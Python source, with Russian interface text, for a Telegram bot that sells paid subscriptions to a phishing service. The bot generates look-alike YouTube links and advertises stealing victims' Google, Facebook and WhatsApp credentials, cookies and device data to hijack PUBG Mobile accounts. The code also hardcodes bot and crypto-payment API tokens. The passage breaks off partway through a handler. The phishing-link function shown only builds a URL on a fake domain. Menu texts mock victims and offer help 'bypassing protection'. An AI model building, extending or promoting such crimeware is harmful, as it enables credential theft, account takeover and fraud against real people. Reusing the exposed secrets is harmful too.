import logging
import aiohttp
import os
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
import datetime
import hashlib

# Определяем директорию где находится код
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

# --- НАСТРОЙКИ ---
API_TOKEN = '8514518192:AAFC2lbIxC8l2VgYUZVUA9Eb3izVWLG_-nY'
CRYPTO_PAY_TOKEN = '526811:AAatyx14fjIZ6GitsEvGO2CO72qBnNyHdIS'
ADMIN_ID = 8524326478

# Цены за подписки
SUBSCRIPTION_PRICES = {
    'basic': 500,      # Базовая подписка
    'pro': 1500,       # Pro подписка
    'premium': 5000    # Premium подписка
}

# Ограничения для подписок
SUBSCRIPTION_LIMITS = {
    'basic': {
        'links': 100,           # 100 ссылок
        'lifetime': 30,         # 30 дней
        'link_lifetime': "2-3 дня",  # Время жизни ссылок
        'features': [
            '100 фишинг-ссылок',
            '30 дней доступа',
            'Базовый антидетект',
            'Для начинающих',
            'Хранение данных 7 дней'
        ]
    },
    'pro': {
        'links': 500,           # 500 ссылок
        'lifetime': 90,         # 90 дней
        'link_lifetime': "5-7 дней",  # Время жизни ссылок
        'features': [
            '500 фишинг-ссылок',
            '90 дней доступа',
            'Pro антидетект',
            'Высокий приоритет',
            'Хранение данных 30 дней',
            'Для профи'
        ]
    },
    'premium': {
        'links': '∞',           # Безлимит
        'lifetime': 365,        # 365 дней
        'link_lifetime': "14-30+ дней",  # Время жизни ссылок
        'features': [
            'Безлимит ссылок',
            '365 дней доступа',
            'Элитный антидетект',
            'Макс. приоритет',
            'Вечное хранение данных',
            'Личная поддержка',
            'Для мастеров',
            'Кастомные домены'
        ]
    }
}

# Настройка логирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

bot = Bot(token=API_TOKEN)
storage = MemoryStorage()
dp = Dispatcher(storage=storage)

# Хранилище (в памяти)
user_likes = {}
user_balances = {}  # {user_id: баланс}
user_data_store = {}  # {user_id: данные пользователя}
user_purchases = {}  # История покупок
user_generated_links = {}  # Сгенерированные ссылки пользователей
user_subscriptions = {}  # {user_id: {'type': тип, 'expiry': дата окончания, 'links_used': использовано, 'links_limit': лимит}}
pending_payments = {}  # {user_id: {'type': 'balance'/'subscription', 'subscription_type': тип, 'invoice_id': id, 'amount': сумма}}

# FSM для состояний
class UserStates(StatesGroup):
    waiting_for_youtube_url = State()
    waiting_for_amount = State()
    waiting_for_coupon = State()

# --- ФУНКЦИИ CRYPTOBOT ---

async def create_crypto_invoice(amount_rub, description):
    """Создает счет в CryptoBot на сумму в рублях"""
    url = "https://pay.crypt.bot/api/createInvoice"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {
        "amount": str(amount_rub),
        "fiat": "RUB",
        "currency_type": "fiat",
        "accepted_assets": "USDT,TON,BTC,ETH,LTC,BNB",
        "description": description,
        "allow_comments": False,
        "expires_in": 3600
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    return data['result']['pay_url'], data['result']['invoice_id']
                else:
                    logging.error(f"Ошибка CryptoBot API: {await resp.text()}")
                    return None, None
    except Exception as e:
        logging.error(f"Ошибка при создании инвойса: {e}")
        return None, None

async def check_crypto_payment(invoice_id):
    """Проверяет статус оплаты счета в CryptoBot"""
    url = f"https://pay.crypt.bot/api/getInvoices"
    headers = {"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}
    payload = {
        "invoice_ids": invoice_id
    }
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=headers, params=payload) as resp:
                if resp.status == 200:
                    data = await resp.json()
                    if data['result']['items']:
                        invoice = data['result']['items'][0]
                        return invoice['status'] == 'paid'
                return False
    except Exception as e:
        logging.error(f"Ошибка при проверке оплаты: {e}")
        return False

def generate_phishing_link(youtube_url, user_id):
    """Генерирует фишинг ссылку из YouTube URL"""
    # Проверяем активную подписку
    if user_id not in user_subscriptions:
        return None, "<b>❌ У вас нет активной подписки!</b>"
    
    subscription = user_subscriptions[user_id]
    
    # Проверяем срок действия
    expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
    if datetime.datetime.now() > expiry_date:
        return None, "<b>❌ Ваша подписка истекла!</b>"
    
    # Проверяем лимит ссылок
    if subscription['links_limit'] != '∞' and subscription['links_used'] >= subscription['links_limit']:
        return None, f"<b>❌ Лимит ссылок исчерпан ({subscription['links_used']}/{subscription['links_limit']})!</b>"
    
    # Создаем уникальный ID на основе URL и user_id
    unique_id = hashlib.md5(f"{youtube_url}{user_id}{datetime.datetime.now().timestamp()}".encode()).hexdigest()[:12]
    
    # Генерируем фишинг-ссылку
    phishing_domain = "youtube-premium-access.com"
    phishing_path = f"/watch/v={unique_id}"
    
    phishing_url = f"https://{phishing_domain}{phishing_path}"
    
    # Сохраняем в истории пользователя
    if user_id not in user_generated_links:
        user_generated_links[user_id] = []
    
    user_generated_links[user_id].append({
        'original': youtube_url,
        'phishing': phishing_url,
        'timestamp': datetime.datetime.now().strftime("%d.%m.%Y %H:%M"),
        'clicks': 0,
        'data_captured': []
    })
    
    # Увеличиваем счетчик использованных ссылок
    subscription['links_used'] += 1
    
    return phishing_url, None

# ============================================
# ФУНКЦИИ РАБОТЫ С ФАЙЛАМИ И КАРТИНКАМИ
# ============================================

def get_image_path(filename):
    """Возвращает полный путь к файлу изображения"""
    return os.path.join(BASE_DIR, filename)

def image_exists(filename):
    """Проверяет существование файла изображения"""
    return os.path.exists(get_image_path(filename))

async def send_photo_or_text(chat_id, image_filename, caption, reply_markup=None):
    """
    Универсальная функция отправки фото или текста
    Если фото не найдено, отправляет текстовое сообщение
    """
    try:
        # Проверяем существование файла
        full_path = get_image_path(image_filename)
        logging.info(f"Пытаюсь отправить фото: {full_path}")
        
        if os.path.exists(full_path):
            logging.info(f"Файл найден, размер: {os.path.getsize(full_path)} байт")
            # Используем FSInputFile для создания объекта файла
            photo = FSInputFile(full_path)
            
            return await bot.send_photo(
                chat_id=chat_id,
                photo=photo,
                caption=caption,
                reply_markup=reply_markup,
                parse_mode='HTML'
            )
        else:
            logging.warning(f"Файл {full_path} не найден")
    except Exception as e:
        logging.error(f"Ошибка при отправке фото {image_filename}: {e}", exc_info=True)
    
    # Если фото не найдено или ошибка, отправляем текстовое сообщение
    logging.info(f"Отправляю текстовое сообщение вместо фото: {image_filename}")
    return await bot.send_message(
        chat_id=chat_id,
        text=caption,
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

async def delete_and_send_photo(chat_id, message_id, photo_path, caption, markup=None):
    """Удаляет старое сообщение и шлет новое с фото"""
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await send_photo_or_text(chat_id, photo_path, caption, markup)

# --- КЛАВИАТУРЫ ---

def get_main_keyboard():
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(text="🎬 ФИШИНГ"),
                KeyboardButton(text="💰 БАЛАНС")
            ],
            [
                KeyboardButton(text="👤 КАБИНЕТ"),
                KeyboardButton(text="💎 ПОДПИСКИ")
            ],
            [
                KeyboardButton(text="🛡️ ГАРАНТИИ"),
                KeyboardButton(text="💬 ПОДДЕРЖКА")
            ]
        ],
        resize_keyboard=True
    )
    return keyboard

def get_profile_keyboard():
    """Клавиатура для личного кабинета"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💳 ПОПОЛНИТЬ", callback_data="top_up_balance")],
            [InlineKeyboardButton(text="💎 КУПИТЬ ДОСТУП", callback_data="show_subscriptions")],
            [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="back_to_main")]
        ]
    )
    return keyboard

def get_back_keyboard():
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="« Назад", callback_data="back_to_profile")]
        ]
    )
    return keyboard

def get_payment_methods_keyboard():
    """Клавиатура выбора способа оплаты"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💎 КРИПТОЙ (CRYPTOBOT)", callback_data="payment_crypto")],
            [InlineKeyboardButton(text="💳 КАРТОЙ (АДМИН)", callback_data="payment_card")],
            [InlineKeyboardButton(text="« Назад", callback_data="back_to_profile")]
        ]
    )
    return keyboard

def get_subscriptions_keyboard():
    """Клавиатура выбора подписки"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"🎯 БАЗА - {SUBSCRIPTION_PRICES['basic']} ₽", callback_data="subscription_basic")],
            [InlineKeyboardButton(text=f"🚀 PRO - {SUBSCRIPTION_PRICES['pro']} ₽", callback_data="subscription_pro")],
            [InlineKeyboardButton(text=f"🏆 PREMIUM - {SUBSCRIPTION_PRICES['premium']} ₽", callback_data="subscription_premium")],
            [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="back_to_main")]
        ]
    )
    return keyboard

def get_converter_keyboard(user_id):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🔄 СГЕНЕРИРОВАТЬ", callback_data="generate_link"),
                InlineKeyboardButton(text="💎 ПОДПИСКИ", callback_data="show_subscriptions")
            ],
            [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="back_to_main")]
        ]
    )
    return keyboard

def get_subscription_details_keyboard(subscription_type):
    """Клавиатура с опциями покупки подписки"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text=f"💎 КРИПТОЙ (CRYPTOBOT)", callback_data=f"buy_crypto_{subscription_type}")],
            [InlineKeyboardButton(text=f"💳 КАРТОЙ (АДМИН)", callback_data=f"buy_card_{subscription_type}")],
            [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

def get_service_keyboard():
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 НАПИСАТЬ", url="https://t.me/htttpspubg")]
        ]
    )
    return keyboard

def get_invoice_keyboard(subscription_type, invoice_id):
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="💳 ОПЛАТИТЬ", callback_data=f"open_invoice_{invoice_id}")],
            [InlineKeyboardButton(text="🔄 ПРОВЕРИТЬ ОПЛАТУ", callback_data=f"check_payment_{invoice_id}")],
            [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

def get_admin_payment_keyboard(subscription_type):
    """Клавиатура для оплаты через администратора"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 НАПИСАТЬ АДМИНУ", url="https://t.me/htttpspubg")],
            [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="show_subscriptions")]
        ]
    )
    return keyboard

def get_how_it_works_keyboard():
    """Клавиатура для сообщения 'Как работает бот'"""
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📱 ПОКАЗАТЬ СКРИНШОТЫ", callback_data="show_screenshots")],
            [InlineKeyboardButton(text="💎 КУПИТЬ ПОДПИСКУ", callback_data="show_subscriptions")],
            [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="back_to_main")]
        ]
    )
    return keyboard

# --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ---

async def delete_and_send(chat_id, message_id, text, markup=None):
    """Удаляет старое сообщение и шлет новое"""
    try:
        await bot.delete_message(chat_id, message_id)
    except Exception:
        pass
    return await bot.send_message(chat_id, text, reply_markup=markup, parse_mode='HTML')

def get_user_data(user_id):
    """Получает данные пользователя"""
    if user_id not in user_data_store:
        user_data_store[user_id] = {
            'name': f"Пользователь #{user_id % 10000:04d}",
            'id': str(user_id),
            'balance': user_balances.get(user_id, 0),
            'reg_date': datetime.datetime.now().strftime("%d.%m.%Y"),
            'total_spent': 0,
            'purchases_count': 0,
            'total_links': 0,
            'successful_attacks': 0,
            'pending_amount': 500
        }
    return user_data_store[user_id]

def get_user_balance(user_id):
    """Получает баланс пользователя"""
    return user_balances.get(user_id, 0)

def get_subscription_info(user_id):
    """Получает информацию о подписке пользователя"""
    if user_id in user_subscriptions:
        subscription = user_subscriptions[user_id]
        expiry_date = datetime.datetime.strptime(subscription['expiry'], "%Y-%m-%d")
        days_left = (expiry_date - datetime.datetime.now()).days
        
        return {
            'type': subscription['type'],
            'expiry': subscription['expiry'],
            'days_left': max(0, days_left),
            'links_used': subscription['links_used'],
            'links_limit': subscription['links_limit']
        }
    return None

def format_message(text, bold_all=False):
    """Форматирует сообщение - делает заголовки жирными"""
    if bold_all:
        return f"<b>{text}</b>"
    
    # Разделяем на строки
    lines = text.strip().split('\n')
    formatted_lines = []
    
    for line in lines:
        line = line.strip()
        if not line:
            formatted_lines.append(line)
        elif line.startswith(('🚀', '🎯', '💰', '👤', '💎', '🎬', '🛡️', '💬', '📱', '✅', '❌', '⚠️', '📋', '🔗', '⏱️', '🔒', '⚡', '🔓', '📅', '📊', '🎯', '📌', '✨', '👇', '📞', '🕒', '🆔')):
            formatted_lines.append(f"<b>{line}</b>")
        else:
            formatted_lines.append(line)
    
    return '\n'.join(formatted_lines)

async def send_how_it_works(chat_id, message_id=None):
    """Отправляет сообщение о том как работает бот"""
    try:
        if message_id:
            try:
                await bot.delete_message(chat_id, message_id)
            except:
                pass
        
        how_it_works_text = format_message("""
🚀 КАК РАБОТАЕТ БОТ

🎯 ФУНКЦИОНАЛ:
• ФИШИНГ YouTube аккаунтов
• КРАЖА данных Google/Facebook
• ПОДМЕНА ссылок в реальном времени
• АВТОСБОР cookies и сессий

⚡ КАК РАБОТАЕТ:
1. Кидаешь YouTube ссылку
2. Бот генерит фишинг-ссылку
3. Кидаешь лоху ссылку
4. Автоматом сливает логины/пароли
5. Ты заходишь в аккаунт PUBG

✅ ЧТО ВОРУЕМ:
• Google/Gmail аккаунты
• Facebook логины
• WhatsApp данные
• Номера телефонов
• Cookies браузеров
• Данные устройств
""", bold_all=True)
        
        await send_photo_or_text(chat_id, "photo9.png", how_it_works_text, get_how_it_works_keyboard())
        
    except Exception as e:
        logging.error(f"Ошибка при отправке как работает бот: {e}")
        await bot.send_message(chat_id, format_message("❌ Ошибка при отправке информации", bold_all=True))

async def send_screenshots(chat_id):
    """Отправляет реальные скриншоты работы бота"""
    try:
        description = format_message("""
📱 РЕАЛЬНЫЕ СКРИНШОТЫ РАБОТЫ

🚨 ВНИМАНИЕ: Бот специализируется на хищении аккаунтов PUBG Mobile!

👇 Вот как выглядят украденные данные от жертв:
""", bold_all=True)
        
        await bot.send_message(chat_id, description, parse_mode='HTML')
        
        caption = format_message("📱 УКРАДЕННЫЕ ДАННЫЕ АККАУНТА\nТипичный результат работы", bold_all=True)
        
        await send_photo_or_text(chat_id, "photo10.png", caption)
        
        final_text = format_message("""
✅ ЭТО РЕАЛЬНЫЕ ДАННЫЕ ОТ ЖЕРТВ!

🎯 ЧТО ВЫ ВИДИТЕ НА СКРИНШОТАХ:

1. Телефон жертвы - модель и серийный номер
2. DPP код - уникальный идентификатор устройства
3. Email и пароль - доступ к почте
4. Facebook аккаунт - логин и пароль
5. Мессенджеры - Viber, WhatsApp, Messenger

⚡ ПРОЦЕСС РАБОТЫ ПРОСТОЙ:
1. Жертва переходит по фишинг ссылке
2. Данные мгновенно приходят вам
3. Вы используете данные для входа в PUBG Mobile
4. Меняете пароль - аккаунт ваш!

⚠️ ВСЕ ДАННЫЕ АНОНИМНЫ:
• Никто не узнает кто вы
• Все транзакции через крипту
• Безопасность 100%
""", bold_all=True)
        
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="💎 КУПИТЬ ПОДПИСКУ", callback_data="show_subscriptions")],
                [InlineKeyboardButton(text="👨‍💻 ЗАДАТЬ ВОПРОС", url="https://t.me/htttpspubg")],
                [InlineKeyboardButton(text="🔙 НАЗАД", callback_data="back_to_main")]
            ]
        )
        
        await bot.send_message(chat_id, final_text, reply_markup=keyboard, parse_mode='HTML')
        
    except Exception as e:
        logging.error(f"Ошибка при отправке скриншотов: {e}")
        await bot.send_message(chat_id, format_message("❌ Ошибка при отправке скриншотов", bold_all=True))

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    user_id = message.from_user.id
    user_data = get_user_data(user_id)
    user_balances[user_id] = user_balances.get(user_id, 0)
    
    welcome_text = format_message(f"""
🔥 PHISHING BOT V3.0

💎 ЛУЧШИЙ ИНСТРУМЕНТ ДЛЯ СКАМА

🎯 ФУНКЦИОНАЛ:
• ФИШИНГ YouTube аккаунтов
• КРАЖА данных Google/Facebook
• ПОДМЕНА ссылок в реальном времени
• АВТОСБОР cookies и сессий

⚡ КАК РАБОТАЕТ:
1. Кидаешь YouTube ссылку
2. Бот генерит фишинг-ссылку
3. Кидаешь лоху ссылку
4. Автоматом сливает логины/пароли
5. Ты заходишь в аккаунт PUBG

✅ ЧТО ВОРУЕМ:
• Google/Gmail аккаунты
• Facebook логины
• WhatsApp данные
• Номера телефонов
• Cookies браузеров
• Данные устройств

🛡️ ГАРАНТИИ:
• БЕЗ ЛОГОВ
• БЕЗ ХРАНЕНИЯ ДАННЫХ
• КРИПТО-ОПЛАТА
• АНОНИМНОСТЬ 100%
""", bold_all=True)
    
    start_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📱 Как юзать", callback_data="how_it_works")],
            [InlineKeyboardButton(text="💎 Купить доступ", callback_data="show_subscriptions")],
            [InlineKeyboardButton(text="🎬 Начать скам", callback_data="generate_link")]
        ]
    )
    
    await send_photo_or_text(message.chat.id, "photo1.png", welcome_text, start_keyboard)

# --- ГЛАВНОЕ МЕНЮ ---

@dp.message(lambda message: message.text == "👤 КАБИНЕТ")
async def handle_profile(message: types.Message):
    user_id = message.from_user.id
    user_data = get_user_data(user_id)
    balance = get_user_balance(user_id)
    subscription_info = get_subscription_info(user_id)
    
    profile_text = format_message(f"""
👤 АККАУНТ СКАММЕРА

🆔 Твой ID: {user_data['id']}
💰 Баланс: {balance} ₽
📅 В системе с: {user_data['reg_date']}
""", bold_all=True)
    
    if subscription_info:
        profile_text += format_message(f"""
💎 ДОСТУП АКТИВЕН
Тариф: {subscription_info['type'].upper()}
Осталось дней: {subscription_info['days_left']}
Использовано: {subscription_info['links_used']}/{subscription_info['links_limit']}
""", bold_all=True)
    else:
        profile_text += format_message("""
💎 ДОСТУП ЗАБЛОКИРОВАН
Купи подписку чтобы начать скам
""", bold_all=True)
    
    profile_text += format_message(f"""
📊 ТВОЯ СТАТИСТИКА:
├ 🎯 ФИШИНГ-ССЫЛОК: {user_data['total_links']}
├ ✅ УСПЕШНЫХ СКАМОВ: {user_data['successful_attacks']}
├ 💰 ПОТРАЧЕНО: {user_data['total_spent']} ₽
└ 🔥 РЕЙТИНГ: {min(100, user_data['successful_attacks'] * 10)}/100

💬 ЕСЛИ ЧТО - ПИШИ: @htttpspubg
""", bold_all=True)
    
    await send_photo_or_text(message.chat.id, "photo2.png", profile_text, get_profile_keyboard())

@dp.message(lambda message: message.text == "💎 ПОДПИСКИ")
async def handle_subscriptions(message: types.Message):
    text = format_message("""
💎 ВЫБЕРИ ДОСТУП

🔓 КУПИ ПОДПИСКУ И НАЧИНАЙ СКАМИТЬ

🎯 БАЗА - 500 ₽
• 100 ФИШИНГ-ССЫЛОК
• 30 ДНЕЙ ДОСТУПА
• БАЗОВЫЙ АНТИДЕТЕКТ
• ДЛЯ НАЧИНАЮЩИХ

🚀 PRO - 1,500 ₽  
• 500 ФИШИНГ-ССЫЛОК
• 90 ДНЕЙ ДОСТУПА
• ПРО АНТИДЕТЕКТ
• ВЫСОКИЙ ПРИОРИТЕТ
• ДЛЯ ПРОФИ

🏆 PREMIUM - 5,000 ₽
• БЕЗЛИМИТ ССЫЛОК
• 365 ДНЕЙ ДОСТУПА
• ЭЛИТНЫЙ АНТИДЕТЕКТ
• МАКС. ПРИОРИТЕТ
• ДЛЯ МАСТЕРОВ

👇 ВЫБИРАЙ ТАРИФ И КАЧАЙ АККИ:
""", bold_all=True)
    
    await send_photo_or_text(message.chat.id, "photo3.png", text, get_subscriptions_keyboard())

@dp.message(lambda message: message.text == "🎬 ФИШИНГ")
async def handle_youtube_converter(message: types.Message):
    user_id = message.from_user.id
    subscription_info = get_subscription_info(user_id)
    
    if not subscription_info:
        text = format_message("""
❌ ДОСТУП ЗАБЛОКИРОВАН

Чтобы генерить фишинг-ссылки нужна подписка.

👇 Выбирай тариф и начинай скамить:
""", bold_all=True)
        await send_photo_or_text(message.chat.id, "photo3.png", text, get_subscriptions_keyboard())
        return
    
    text = format_message(f"""
🎬 ФИШИНГ ГЕНЕРАТОР

💎 Твой тариф: {subscription_info['type'].upper()}
🔗 Использовано: {subscription_info['links_used']}/{subscription_info['links_limit']}
⏱ Осталось дней: {subscription_info['days_left']}

📌 КИДАЙ ЛЮБУЮ YouTube ССЫЛКУ:

Примеры:
• https://youtu.be/rVHGiFCuL-w
• https://youtube.com/watch?v=ID

⚡ БОТ СГЕНЕРИТ ФИШИНГ-ССЫЛКУ
🎯 КИДАЕШЬ ЕЁ ЛОХУ
✅ ПОЛУЧАЕШЬ ЕГО ДАННЫЕ

👇 КИДАЙ ССЫЛКУ ПРЯМО СЕЙЧАС:
""", bold_all=True)
    
    await send_photo_or_text(message.chat.id, "photo7.png", text, get_converter_keyboard(user_id))

@dp.message(lambda message: message.text == "🛡️ ГАРАНТИИ")
async def handle_security(message: types.Message):
    security_text = format_message("""
🛡️ ГАРАНТИИ И БЕЗОПАСНОСТЬ

✅ ПОДПИСКИ ВЫДАЮТСЯ АВТОМАТОМ:

• Оплатил криптой → доступ открылся СРАЗУ
• Никаких "кидалово" и обмана
• Бот сам активирует подписку через 1-3 минуты
• Всё честно и прозрачно

✅ ПОЧЕМУ МЫ НЕ ОБМАНЫВАЕМ:

• Работаем с 2020 года
• Бот приносит 10к+ в месяц
• Нам ВЫГОДНЕ продавать доступ
• Мы НЕ ПРОДАЕМ воздух - даём рабочий инструмент

✅ ЧЕСТНЫЕ ПРИЧИНЫ:

1. Автомат сам выдаёт доступ после оплаты
2. Нам не нужно вас обманывать - инструмент РАБОЧИЙ
3. Вы покупаете РЕАЛЬНЫЙ софт для заработка
4. Наша репутация стоит дороже 500₽

✅ ГАРАНТИИ РАБОТЫ:

• Если бот не работает - ВОЗВРАТ ДЕНЕГ
• Поддержка 24/7
• Регулярные обновления
• Помощь в настройке

✅ КАК ПРОВЕРИТЬ:

1. Купи БАЗОВУЮ подписку за 500₽
2. Сразу получи доступ к генератору
3. Сгенерируй фишинг-ссылку
4. Проверь что всё работает
5. Если не работает - МГНОВЕННЫЙ возврат

👇 ПОПРОБУЙ НА САМОМ ДЕШЁВОМ ТАРИФЕ:
""", bold_all=True)
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🎯 КУПИТЬ БАЗУ (500₽)", callback_data="subscription_basic")],
            [InlineKeyboardButton(text="💬 СПРОСИТЬ У ДРУГИХ", url="https://t.me/htttpspubg")]
        ]
    )
    
    await send_photo_or_text(message.chat.id, "photo4.png", security_text, keyboard)

@dp.message(lambda message: message.text == "💬 ПОДДЕРЖКА")
async def handle_support(message: types.Message):
    support_text = format_message("""
💬 ТЕХПОДДЕРЖКА 24/7

🕒 Отвечаем 2-5 минут
📞 Только Telegram: @htttpspubg

🎯 ПОМОГАЕМ С:
• Настройкой фишинг-ссылок
• Решением проблем
• Консультацией по скаму
• Обходом защиты

⚠️ ВАЖНО:
• Пиши только в Telegram
• Гарантия анонимности
• Консультации бесплатны

👇 ПИШИ ЕСЛИ ЧТО:
""", bold_all=True)
    
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="👨‍💻 НАПИСАТЬ", url="https://t.me/htttpspubg")]
        ]
    )
    
    await send_photo_or_text(message.chat.id, "photo5.png", support_text, keyboard)

@dp.message(lambda message: message.text == "💰 БАЛАНС")
async def handle_balance(message: types.Message):
    user_id = message.from_user.id
    balance = get_user_balance(user_id)
    
    balance_text = format_message(f"""
💰 ТВОЙ БАЛАНС

Текущий баланс: {balance} ₽

💳 ПОПОЛНЯЙ ЧЕРЕЗ CRYPTOBOT:
• Мгновенно
• 0% комиссия
• Полная анонимность

👇 ИДИ В "КАБИНЕТ" → "ПОПОЛНИТЬ"
""", bold_all=True)
    
    await send_photo_or_text(message.chat.id, "photo6.png", balance_text)

@dp.message(lambda message: message.text == "📱 Как работает бот")
async def handle_how_it_works(message: types.Message):
    """Обработчик кнопки 'Как работает бот'"""
    await send_how_it_works(message.chat.id)

# --- CALLBACK ОБРАБОТЧИКИ ---

@dp.callback_query(lambda callback_query: callback_query.data == 'how_it_works')
async def callback_how_it_works(callback_query: types.CallbackQuery):
    """Callback для кнопки 'Как работает бот'"""
    await send_how_it_works(callback_query.message.chat.id, callback_query.message.message_id)
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data == 'show_screenshots')
async def callback_show_screenshots(callback_query: types.CallbackQuery):
    """Callback для кнопки 'Показать скриншоты работы'"""
    await send_screenshots(callback_query.message.chat.id)
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data == 'back_to_main')
async def back_to_main(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_data = get_user_data(user_id)
    
    welcome_text = format_message(f"""
🔥 PHISHING BOT V3.0

💎 ЛУЧШИЙ ИНСТРУМЕНТ ДЛЯ СКАМА

🎯 ФУНКЦИОНАЛ:
• ФИШИНГ YouTube аккаунтов
• КРАЖА данных Google/Facebook
• ПОДМЕНА ссылок в реальном времени
• АВТОСБОР cookies и сессий

⚡ КАК РАБОТАЕТ:
1. Кидаешь YouTube ссылку
2. Бот генерит фишинг-ссылку
3. Кидаешь лоху ссылку
4. Автоматом сливает логины/пароли
5. Ты заходишь в аккаунт PUBG

✅ ЧТО ВОРУЕМ:
• Google/Gmail аккаунты
• Facebook логины
• WhatsApp данные
• Номера телефонов
• Cookies браузеров
• Данные устройств

🛡️ ГАРАНТИИ:
• БЕЗ ЛОГОВ
• БЕЗ ХРАНЕНИЯ ДАННЫХ
• КРИПТО-ОПЛАТА
• АНОНИМНОСТЬ 100%
""", bold_all=True)
    
    start_keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="📱 Как юзать", callback_data="how_it_works")],
            [InlineKeyboardButton(text="💎 Купить доступ", callback_data="show_subscriptions")],
            [InlineKeyboardButton(text="🎬 Начать скам", callback_data="generate_link")]
        ]
    )
    
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo1.png", welcome_text, start_keyboard)
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data == 'back_to_profile')
async def back_to_profile(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_data = get_user_data(user_id)
    balance = get_user_balance(user_id)
    subscription_info = get_subscription_info(user_id)
    
    profile_text = format_message(f"""
👤 АККАУНТ СКАММЕРА

🆔 Твой ID: {user_data['id']}
💰 Баланс: {balance} ₽
📅 В системе с: {user_data['reg_date']}
""", bold_all=True)
    
    if subscription_info:
        profile_text += format_message(f"""
💎 ДОСТУП АКТИВЕН
Тариф: {subscription_info['type'].upper()}
Осталось дней: {subscription_info['days_left']}
Использовано: {subscription_info['links_used']}/{subscription_info['links_limit']}
""", bold_all=True)
    else:
        profile_text += format_message("""
💎 ДОСТУП ЗАБЛОКИРОВАН
Купи подписку чтобы начать скам
""", bold_all=True)
    
    profile_text += format_message(f"""
📊 ТВОЯ СТАТИСТИКА:
├ 🎯 ФИШИНГ-ССЫЛОК: {user_data['total_links']}
├ ✅ УСПЕШНЫХ СКАМОВ: {user_data['successful_attacks']}
├ 💰 ПОТРАЧЕНО: {user_data['total_spent']} ₽
└ 🔥 РЕЙТИНГ: {min(100, user_data['successful_attacks'] * 10)}/100

💬 ЕСЛИ ЧТО - ПИШИ: @htttpspubg
""", bold_all=True)
    
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo2.png", profile_text, get_profile_keyboard())
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data == 'show_subscriptions')
async def show_subscriptions(callback_query: types.CallbackQuery):
    text = format_message("""
💎 ВЫБЕРИ ДОСТУП

🔓 КУПИ ПОДПИСКУ И НАЧИНАЙ СКАМИТЬ

🎯 БАЗА - 500 ₽
• 100 ФИШИНГ-ССЫЛОК
• 30 ДНЕЙ ДОСТУПА

🚀 PRO - 1,500 ₽  
• 500 ФИШИНГ-ССЫЛОК
• 90 ДНЕЙ ДОСТУПА

🏆 PREMIUM - 5,000 ₽
• БЕЗЛИМИТ ССЫЛОК
• 365 ДНЕЙ ДОСТУПА

👇 ВЫБИРАЙ ТАРИФ:
""", bold_all=True)
    
    await delete_and_send_photo(callback_query.message.chat.id, callback_query.message.message_id,
                              "photo3.png", text, get_subscriptions_keyboard())
    await callback_query.answer()

@dp.callback_query(lambda callback_query: callback_query.data.startswith('subscription_'))
async def subscription_details(callback_query: types.CallbackQuery):
    subscription_type = callback_query.data.replace('subscription_', '')
    
    if subscription_type in SUBSCRIPTION_PRICES:
        price = SUBSCRIPTION_PRICES[subscription_type]
        limits = SUBSCRIPTION_LIMITS[subscription_type]
        
